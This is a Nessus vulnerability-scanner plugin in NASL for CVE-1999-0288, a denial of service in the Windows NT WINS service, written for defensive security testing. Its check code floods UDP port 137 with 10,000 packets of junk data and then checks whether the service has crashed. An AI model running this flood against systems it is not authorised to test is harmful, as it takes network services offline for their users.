#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10315);
  script_version ("$Revision: 1.24 $");
  script_cve_id("CVE-1999-0288");
  script_bugtraq_id(298);
  script_osvdb_id(967);

  script_name(english:"Microsoft Windows NT WINS Service Malformed Data DoS");
  script_summary(english:"Crashes the remote WINS server");

   script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"We could crash the remote WINS server by sending it a lot of UDP packets containing
random data.

If you do not use WINS, then deactivate this server.

An attacker may use this flaw to bring down your NT network."
  );

  script_set_attribute(
    attribute:'solution',
    value:"Upgrade Windows NT to SP5 or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(
    attribute:'see_also',
    value:'http://safenetworks.com/Windows/wins.html'
  );

 script_set_attribute(attribute:"plugin_publication_date", value: "1999/08/30");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/06/04");
 script_cvs_date("$Date: 2016/11/29 20:13:38 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);	# ACT_FLOOD?
  script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
  script_family(english:"Windows");
  script_require_ports(137);
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");

if (! get_port_state(137)) exit(0, "TCP port 137 is closed.");
if (! get_udp_port_state(137)) exit(0, "UDP port 137 is closed.");

soc = open_sock_tcp(137);
if (! soc) exit(1);

  close(soc);
  udp_soc = open_sock_udp(137);
  crp = crap(1000);

  for(j=0;j<10000;j=j+1)
  {
   send(socket:udp_soc, data:crp);
  }

  close(udp_soc);

if (service_is_dead(port: 137) > 0)
  security_warning(137);
